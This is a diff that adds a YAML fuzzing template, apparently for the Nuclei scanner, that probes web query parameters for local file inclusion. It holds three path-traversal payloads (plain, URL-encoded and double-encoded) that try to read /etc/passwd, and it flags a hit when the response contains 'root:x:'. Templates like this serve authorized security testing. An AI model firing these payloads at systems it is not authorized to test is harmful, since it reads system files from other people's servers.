@@ -1,0 +1,30 @@
+id: fuzz-lfi-basic
+
+info:
+  name: LFI Basic Traversal
+  author: openai
+  severity: high
+  tags: lfi,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      lfi:
+        - "../../../../../../etc/passwd"
+        - "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+        - "..%252f..%252f..%252f..%252fetc%252fpasswd"
+
+    fuzzing:
+      - part: query
+        mode: multiple
+        fuzz:
+          - "{{lfi}}"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:"
